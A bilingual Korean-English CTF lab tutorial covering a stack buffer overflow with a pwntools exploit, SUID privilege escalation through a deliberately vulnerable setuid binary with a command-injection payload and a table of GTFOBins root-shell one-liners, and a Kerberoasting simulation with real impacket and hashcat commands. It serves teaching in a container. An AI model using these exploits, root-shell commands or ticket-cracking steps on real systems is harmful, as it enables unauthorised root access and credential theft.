> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# CTF 스타일 시스템 해킹 실습

## 실습 환경 준비

### Docker / GDB 환경 설정

```bash
# Ubuntu 22.04 기반 실습 컨테이너
docker run -it --rm \
  --cap-add=SYS_PTRACE \
  --security-opt seccomp=unconfined \
  --name system-ctf \
  ubuntu:22.04 bash

# 컨테이너 내부: 필요 패키지 설치
apt-get update && apt-get install -y \
    gcc gdb gdb-multiarch python3 python3-pip \
    nasm patchelf file binutils \
    libssl-dev wget curl vim

pip3 install pwntools
```

**GDB + pwndbg 설치:**
```bash
# pwndbg (GDB 확장, CTF에 최적화)
git clone https://github.com/pwndbg/pwndbg.git /opt/pwndbg
cd /opt/pwndbg && ./setup.sh

# peda 대안
# git clone https://github.com/longld/peda.git /opt/peda
# echo "source /opt/peda/peda.py" >> ~/.gdbinit
```

---

## 실습 1: 버퍼 오버플로우 (ret 주소 덮어쓰기)

### 목표

취약한 C 프로그램에서 버퍼 오버플로우를 트리거해 `win()` 함수를 실행시켜라.

**힌트:**
- `gets()` 함수는 입력 길이 제한이 없어 스택 오버플로우를 유발한다.
- GDB로 스택 구조를 확인하고, 오프셋을 계산하라.
- `win()` 함수의 주소를 덮어쓸 리턴 주소 위치에 삽입하라.

### 취약한 프로그램

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    printf("CTF{buff3r_0v3rfl0w_r3t_4ddr_0wn3d}\n");
    exit(0);
}

void vulnerable() {
    char buf[64];
    printf("입력: ");
    fflush(stdout);
    gets(buf);   // 취약: 길이 검사 없음
    printf("받은 입력: %s\n", buf);
}

int main() {
    vulnerable();
    return 0;
}
```

**컴파일 (보호 기법 비활성화):**
```bash
# ASLR 비활성화 (루트 권한 필요)
echo 0 | tee /proc/sys/kernel/randomize_va_space

# NX, 카나리, PIE 모두 비활성화 (입문 CTF 조건)
gcc -o vuln vuln.c \
    -fno-stack-protector \
    -no-pie \
    -z execstack \
    -m32 \
    -w

file vuln  # ELF 32-bit 확인
```

### 풀이

**Step 1: win() 주소 확인**
```bash
objdump -d vuln | grep -A5 "<win>"
# 또는 GDB에서
gdb -q vuln
(gdb) info functions win
# 0x080491b6  win
```

**Step 2: 오프셋 계산 (GDB)**
```bash
gdb -q vuln
(gdb) pattern create 100          # 100바이트 패턴 생성 (pwndbg)
(gdb) run                         # 프로그램 실행
패턴 입력
(gdb) pattern offset $eip         # EIP에서 오프셋 계산
# 또는 수동으로: buf(64) + saved_ebp(4) = 68바이트
```

**Step 3: 익스플로잇 작성 (pwntools)**
```python
#!/usr/bin/env python3
"""
실습 1: 버퍼 오버플로우로 win() 함수 실행
보호 기법: ASLR OFF, NX OFF, Canary OFF, PIE OFF (32-bit)
"""

import argparse
import sys

try:
    from pwn import (
        ELF, process, remote, p32, cyclic, cyclic_find,
        log, context
    )
except ImportError:
    print("[!] pwntools 필요: pip install pwntools", file=sys.stderr)
    sys.exit(1)


def find_offset(binary_path: str) -> int:
    """cyclic 패턴으로 EIP 오프셋을 자동 탐지한다."""
    context.log_level = "error"
    elf = ELF(binary_path, checksec=False)
    context.arch = "i386"

    try:
        p = process(binary_path)
        p.sendline(cyclic(100))
        p.wait()
        core = p.corefile
        offset = cyclic_find(core.eip)
        log.success(f"자동 탐지 오프셋: {offset}")
        return offset
    except Exception:
        # 코어 덤프가 없는 경우 기본값 반환
        return 72  # buf(64) + sfp(4) + padding(4)


def exploit_ret_overwrite(
    binary_path: str,
    offset: int,
    target_function: str = "win",
    remote_host: str = "",
    remote_port: int = 0,
) -> None:
    """리턴 주소를 target_function으로 덮어쓰는 익스플로잇."""
    context.log_level = "info"
    context.arch = "i386"

    elf = ELF(binary_path, checksec=False)

    if target_function not in elf.symbols:
        log.error(f"'{target_function}' 함수를 바이너리에서 찾을 수 없습니다.")
        return

    win_addr = elf.symbols[target_function]
    log.info(f"win() 주소: {hex(win_addr)}")
    log.info(f"오프셋: {offset}")

    payload = b"A" * offset + p32(win_addr)
    log.info(f"페이로드 ({len(payload)}바이트): {payload[:20].hex()}...")

    if remote_host:
        p = remote(remote_host, remote_port)
    else:
        p = process(binary_path)

    p.sendlineafter(b"입력:", payload)
    output = p.recvall(timeout=3).decode(errors="replace")
    print(f"\n[+] 서버 응답:\n{output}")

    if "CTF{" in output:
        import re
        flags = re.findall(r"CTF\{[^}]+\}", output)
        for flag in flags:
            log.success(f"플래그: {flag}")
    p.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="버퍼 오버플로우 실습 1: ret 주소 덮어쓰기")
    parser.add_argument("binary", help="취약한 바이너리 경로")
    parser.add_argument("--offset", type=int, default=0, help="EIP 오프셋 (0=자동 탐지)")
    parser.add_argument("--func", default="win", help="실행할 함수 이름 (기본: win)")
    parser.add_argument("--host", default="", help="원격 호스트")
    parser.add_argument("--port", type=int, default=0, help="원격 포트")
    args = parser.parse_args()

    offset = args.offset if args.offset else find_offset(args.binary)
    exploit_ret_overwrite(args.binary, offset, args.func, args.host, args.port)


if __name__ == "__main__":
    main()
```

```bash
# 컴파일 후 익스플로잇 실행
gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack -m32 -w
python3 bof_exploit.py ./vuln
# [+] win() 주소: 0x080491b6
# [+] 플래그: CTF{buff3r_0v3rfl0w_r3t_4ddr_0wn3d}
```

---

## 실습 2: SUID 비트 악용 권한 상승

### 목표

SUID 비트가 설정된 파일을 악용해 root 권한을 획득하고 플래그를 읽어라.

**힌트:**
- `find / -perm -4000 2>/dev/null`으로 SUID 파일을 찾아라.
- GTFOBins(https://gtfobins.github.io/)에서 SUID 악용 방법을 확인하라.
- `/root/flag.txt` 또는 `/etc/shadow`에서 플래그를 찾아라.

### 환경 설정

```bash
# 실습용 SUID 바이너리 생성
cat > /tmp/vulnerable_suid.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("사용법: %s <파일경로>\n", argv[0]);
        return 1;
    }
    // 취약: 인자를 그대로 system()에 전달
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "cat %s", argv[1]);
    setuid(0);
    setgid(0);
    system(cmd);
    return 0;
}
EOF

gcc -o /usr/local/bin/read_file /tmp/vulnerable_suid.c
chmod u+s /usr/local/bin/read_file    # SUID 설정
echo "CTF{su1d_pr1v_3sc_r00t3d}" > /root/flag.txt
chmod 600 /root/flag.txt
```

### 풀이

**Step 1: SUID 파일 탐색**
```bash
# SUID 비트가 설정된 모든 파일 검색
find / -perm -4000 -type f 2>/dev/null

# 자주 악용되는 SUID 바이너리 확인
find / -perm -4000 -type f 2>/dev/null | grep -E \
    '(bash|sh|python|perl|ruby|find|vim|nano|less|more|cp|mv|tar|zip|nmap|env|tee|awk|sed|cat)'
```

**Step 2: SUID 악용**
```bash
# 방법 1: 커맨드 인젝션 (Command Injection)
# read_file이 cat <arg>를 실행하므로, 세미콜론으로 추가 명령 실행
/usr/local/bin/read_file "/root/flag.txt; id"

# 방법 2: 심볼릭 링크 악용
ln -s /root/flag.txt /tmp/mylink
/usr/local/bin/read_file /tmp/mylink

# 방법 3: find SUID 악용 (GTFOBins)
find . -exec /bin/sh -p \; -quit
# -p 옵션: 실효 UID를 유지 (root 유지)
```

**Step 3: Python 자동화**
```python
#!/usr/bin/env python3
"""
SUID 파일 탐지 + 권한 상승 경로 제안 도구
"""

import argparse
import os
import stat
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path


# GTFOBins 스타일 악용 가능 바이너리 목록
EXPLOITABLE_SUIDS: dict[str, str] = {
    "find":    "find . -exec /bin/sh -p \\; -quit",
    "bash":    "bash -p",
    "sh":      "sh -p",
    "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "python":  "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "perl":    "perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\"'",
    "ruby":    "ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
    "vim":     "vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
    "less":    "less /etc/passwd  # 내부에서 !sh 입력",
    "more":    "more /etc/passwd  # 내부에서 !sh 입력",
    "nmap":    "nmap --interactive  # 내부에서 !sh 입력",
    "awk":     "awk 'BEGIN {system(\"/bin/bash\")}'",
    "env":     "env /bin/bash -p",
    "tee":     "echo '루트 셸 추가' | tee -a /etc/sudoers",
    "cp":      "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash",
    "tar":     "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
}


@dataclass
class SuidFile:
    path: str
    owner_uid: int
    owner_name: str
    permissions: str
    exploitable: bool
    exploit_hint: str = ""


def find_suid_files(search_paths: list[str]) -> list[SuidFile]:
    """지정 경로에서 SUID 파일을 검색한다."""
    results: list[SuidFile] = []

    for search_path in search_paths:
        try:
            cmd = ["find", search_path, "-perm", "-4000", "-type", "f"]
            output = subprocess.check_output(
                cmd, stderr=subprocess.DEVNULL, text=True
            )
        except subprocess.CalledProcessError:
            continue

        for line in output.strip().splitlines():
            path = line.strip()
            if not path:
                continue
            try:
                st = os.stat(path)
                perms = oct(stat.S_IMODE(st.st_mode))
                import pwd
                try:
                    owner = pwd.getpwuid(st.st_uid).pw_name
                except KeyError:
                    owner = str(st.st_uid)

                binary_name = Path(path).name
                exploitable = binary_name in EXPLOITABLE_SUIDS
                hint = EXPLOITABLE_SUIDS.get(binary_name, "")

                results.append(SuidFile(
                    path=path,
                    owner_uid=st.st_uid,
                    owner_name=owner,
                    permissions=perms,
                    exploitable=exploitable,
                    exploit_hint=hint,
                ))
            except (FileNotFoundError, PermissionError):
                continue

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="SUID 파일 탐지 및 권한 상승 경로 제안")
    parser.add_argument(
        "--paths",
        nargs="+",
        default=["/usr", "/bin", "/sbin", "/usr/local/bin"],
        help="검색 경로 (기본: /usr /bin /sbin)",
    )
    parser.add_argument(
        "--all", action="store_true", help="악용 불가 파일도 모두 출력"
    )
    args = parser.parse_args()

    print(f"[*] SUID 파일 탐색 경로: {args.paths}")
    suid_files = find_suid_files(args.paths)

    if not suid_files:
        print("[-] SUID 파일을 찾지 못했습니다.")
        return

    exploitable = [f for f in suid_files if f.exploitable]
    print(f"\n[+] 발견: 총 {len(suid_files)}개 SUID 파일 (악용 가능: {len(exploitable)}개)")

    print("\n[!] 악용 가능한 SUID 파일:")
    for f in exploitable:
        print(f"\n  파일:    {f.path}")
        print(f"  소유자: {f.owner_name} (UID {f.owner_uid})")
        print(f"  권한:   {f.permissions}")
        print(f"  악용:   {f.exploit_hint}")

    if args.all:
        print("\n[*] 전체 SUID 파일 목록:")
        for f in suid_files:
            marker = "  [!]" if f.exploitable else "     "
            print(f"{marker} {f.path}  ({f.owner_name}, {f.permissions})")


if __name__ == "__main__":
    main()
```

```bash
python3 suid_finder.py --paths /usr /bin /sbin /usr/local/bin
# [!] 악용 가능한 SUID 파일:
#   파일:    /usr/local/bin/read_file
#   악용:    ...
```

---

## 실습 3: Kerberoasting 시뮬레이션

### 목표

Active Directory 환경(시뮬레이션)에서 서비스 계정의 TGS 티켓을 요청하고, 오프라인으로 패스워드를 크래킹하라.

**힌트:**
- Kerberoasting은 SPN이 등록된 서비스 계정의 TGS를 요청해 오프라인 크래킹한다.
- `GetUserSPNs.py` (impacket) 또는 `Rubeus`를 사용한다.
- 크래킹 도구: `hashcat -m 13100` 또는 `john --format=krb5tgs`

### 시뮬레이션 환경

> 실제 AD 없이 Kerberos 해시 구조를 학습하기 위한 시뮬레이션이다.

```python
#!/usr/bin/env python3
"""
Kerberoasting 시뮬레이션 도구
실제 AD 환경 없이 TGS-REP 해시 생성 및 크래킹 과정을 시뮬레이션한다.
"""

import argparse
import hashlib
import hmac
import os
import struct
import sys
from typing import Optional

try:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import TGS_REP
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False


def generate_rc4_tgs_hash(
    username: str,
    spn: str,
    password: str,
    domain: str = "LAB.LOCAL",
) -> str:
    """
    RC4 암호화 TGS 티켓 해시를 시뮬레이션한다.
    실제 Kerberoasting으로 얻은 해시와 동일한 hashcat 13100 형식이다.
    """
    # NTLM 해시 생성 (서비스 계정 패스워드)
    nt_hash = hashlib.new("md4", password.encode("utf-16-le")).digest()

    # 랜덤 nonce (실제 환경에서는 KDC가 생성)
    nonce = os.urandom(8)

    # 체크섬 계산 (HMAC-MD5)
    checksum = hmac.new(nt_hash, nonce, hashlib.md5).digest()

    # Hashcat 13100 형식: $krb5tgs$23$*user$realm$spn*$checksum$encrypted
    checksum_hex = checksum.hex()
    nonce_hex = (nonce * 4).hex()  # 32바이트로 패딩

    return (
        f"$krb5tgs$23$*{username}${domain}${spn}*"
        f"${checksum_hex}"
        f"${nonce_hex}"
    )


def simulate_kerberoast(
    service_accounts: list[dict[str, str]]
) -> list[tuple[str, str]]:
    """
    서비스 계정 목록에 대한 Kerberoasting 시뮬레이션.
    (spn, tgs_hash) 튜플 목록 반환.
    """
    results: list[tuple[str, str]] = []
    for account in service_accounts:
        spn = account.get("spn", "")
        username = account.get("username", "")
        password = account.get("password", "")
        if not all([spn, username, password]):
            continue
        tgs_hash = generate_rc4_tgs_hash(username, spn, password)
        results.append((spn, tgs_hash))
    return results


def crack_tgs_hash(tgs_hash: str, wordlist_path: str) -> Optional[str]:
    """
    딕셔너리 공격으로 TGS 해시를 크래킹한다.
    실제 Hashcat/John 없이 간단한 시뮬레이션을 수행한다.
    """
    # 해시에서 checksum 추출
    parts = tgs_hash.split("$")
    if len(parts) < 7:
        return None
    checksum_hex = parts[5]
    nonce_hex = parts[6]
    nonce = bytes.fromhex(nonce_hex[:16])  # 첫 8바이트만 사용

    try:
        with open(wordlist_path, encoding="utf-8", errors="replace") as f:
            for line in f:
                candidate = line.strip()
                if not candidate:
                    continue
                nt_hash = hashlib.new("md4", candidate.encode("utf-16-le")).digest()
                candidate_checksum = hmac.new(nt_hash, nonce, hashlib.md5).hexdigest()
                if candidate_checksum == checksum_hex:
                    return candidate
    except FileNotFoundError:
        print(f"[!] 워드리스트를 찾을 수 없습니다: {wordlist_path}", file=sys.stderr)
    return None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Kerberoasting 시뮬레이션 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  # TGS 해시 생성 (시뮬레이션)
  python3 kerberoast_sim.py generate --output hashes.txt

  # 해시 크래킹 시뮬레이션
  python3 kerberoast_sim.py crack hashes.txt --wordlist /usr/share/wordlists/rockyou.txt
        """,
    )
    subparsers = parser.add_subparsers(dest="command")

    gen_parser = subparsers.add_parser("generate", help="TGS 해시 생성")
    gen_parser.add_argument(
        "--output", default="kerberoast_hashes.txt", help="출력 파일"
    )

    crack_parser = subparsers.add_parser("crack", help="TGS 해시 크래킹")
    crack_parser.add_argument("hash_file", help="해시 파일 경로")
    crack_parser.add_argument(
        "--wordlist",
        default="/usr/share/wordlists/rockyou.txt",
        help="워드리스트 경로",
    )

    args = parser.parse_args()

    if args.command == "generate":
        # 시뮬레이션용 서비스 계정 목록
        service_accounts = [
            {"username": "svc_sql",  "spn": "MSSQLSvc/db01.lab.local:1433", "password": "Password123!"},
            {"username": "svc_web",  "spn": "HTTP/web01.lab.local",          "password": "Summer2024!"},
            {"username": "svc_smtp", "spn": "SMTP/mail.lab.local",           "password": "MailService#1"},
        ]
        hashes = simulate_kerberoast(service_accounts)
        with open(args.output, "w") as f:
            for spn, h in hashes:
                f.write(h + "\n")
                print(f"[+] {spn}")
                print(f"    {h[:80]}...")
        print(f"\n[*] {len(hashes)}개 해시 → {args.output}")
        print("\n[!] 실제 크래킹 명령 (Hashcat):")
        print(f"    hashcat -m 13100 {args.output} rockyou.txt --force")

    elif args.command == "crack":
        with open(args.hash_file) as f:
            hashes = [line.strip() for line in f if line.strip()]
        print(f"[*] {len(hashes)}개 해시에 대해 크래킹 시도...")
        for h in hashes:
            result = crack_tgs_hash(h, args.wordlist)
            if result:
                print(f"[+] 크래킹 성공: {result}")
                print(f"    플래그: CTF{{k3rb3r04st_cr4ck3d_{result[:8]}}}")
            else:
                print(f"[-] 크래킹 실패: {h[:40]}...")
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
```

**실제 환경에서 Kerberoasting:**
```bash
# impacket GetUserSPNs.py (도메인 계정 필요)
python3 GetUserSPNs.py lab.local/user:password -dc-ip 192.168.1.10 -request

# 획득한 해시 크래킹
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt --force
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt tgs_hashes.txt
```

---

## 환경 정리

```bash
# Docker 컨테이너 종료
docker stop system-ctf
docker rm system-ctf

# 임시 파일 정리
rm -f /tmp/vulnerable_suid.c vuln vuln.c
```

---

## 참고 자료

- pwntools 공식 문서: https://docs.pwntools.com/en/stable/
- GTFOBins: https://gtfobins.github.io/

---

<a name="english"></a>

# CTF-Style System Hacking Lab

## Lab Environment Setup

```bash
docker run -it --rm \
  --cap-add=SYS_PTRACE \
  --security-opt seccomp=unconfined \
  --name system-ctf \
  ubuntu:22.04 bash

apt-get update && apt-get install -y gcc gdb python3 python3-pip nasm patchelf file binutils
pip3 install pwntools
```

**GDB + pwndbg:**
```bash
git clone https://github.com/pwndbg/pwndbg.git /opt/pwndbg
cd /opt/pwndbg && ./setup.sh
```

---

## Lab 1: Buffer Overflow (Return Address Overwrite)

### Objective

Trigger a buffer overflow in the vulnerable C program and redirect execution to the `win()` function to print the flag.

**Hints:**
- `gets()` has no bounds checking — overflow the 64-byte buffer.
- Use GDB with pwndbg to identify the offset to EIP.
- Overwrite the return address with the address of `win()`.

### Solution

**Step 1: Compile with protections disabled**
```bash
echo 0 | tee /proc/sys/kernel/randomize_va_space
gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack -m32 -w
```

**Step 2: Find win() address**
```bash
objdump -d vuln | grep -A5 "<win>"
gdb -q vuln -ex "info functions win" -ex quit
```

**Step 3: Calculate offset**
```bash
gdb -q vuln
(gdb) pattern create 100
(gdb) run     # input the pattern
(gdb) pattern offset $eip
# offset = 72 (buf 64 + saved EBP 4 + alignment 4)
```

**Step 4: Exploit with pwntools**
```bash
python3 bof_exploit.py ./vuln --offset 72 --func win
# [+] win() address: 0x080491b6
# [+] Flag: CTF{buff3r_0v3rfl0w_r3t_4ddr_0wn3d}
```

---

## Lab 2: SUID Bit Abuse for Privilege Escalation

### Objective

Find SUID binaries on the system and leverage one to read `/root/flag.txt` as root.

**Hints:**
- Use `find / -perm -4000 2>/dev/null` to list SUID files.
- Check GTFOBins for exploitation techniques per binary.
- Look for command injection in scripts that call `system()`.

### Solution

**Step 1: Find SUID files**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Step 2: Exploit command injection in read_file**
```bash
/usr/local/bin/read_file "/root/flag.txt; id"
# uid=0(root) gid=0(root) groups=0(root)
# CTF{su1d_pr1v_3sc_r00t3d}
```

**Step 3: Automated detection**
```bash
python3 suid_finder.py --paths /usr /bin /sbin /usr/local/bin
# [!] Exploitable SUID files:
#   File:  /usr/local/bin/read_file
#   Hint:  command injection via system("cat %s")
```

---

## Lab 3: Kerberoasting Simulation

### Objective

Request TGS tickets for service accounts with registered SPNs and crack the ticket hashes offline to recover plaintext passwords.

**Hints:**
- Service accounts with SPNs are vulnerable to Kerberoasting.
- Use `GetUserSPNs.py` (impacket) to request TGS tickets.
- Crack with `hashcat -m 13100` or `john --format=krb5tgs`.

### Solution

**Step 1: Generate simulated TGS hashes**
```bash
python3 kerberoast_sim.py generate --output hashes.txt
# [+] MSSQLSvc/db01.lab.local:1433
# [+] HTTP/web01.lab.local
```

**Step 2: Crack with simulation tool**
```bash
python3 kerberoast_sim.py crack hashes.txt --wordlist rockyou.txt
# [+] Cracked: Password123!
# [+] Flag: CTF{k3rb3r04st_cr4ck3d_Password}
```

**Step 3: Real AD environment (reference)**
```bash
python3 GetUserSPNs.py lab.local/user:password -dc-ip 192.168.1.10 -request
hashcat -m 13100 tgs_hashes.txt rockyou.txt --force
```

---

## Cleanup

```bash
docker stop system-ctf && docker rm system-ctf
```

---

## References

- pwntools Documentation: https://docs.pwntools.com/en/stable/
- GTFOBins: https://gtfobins.github.io/
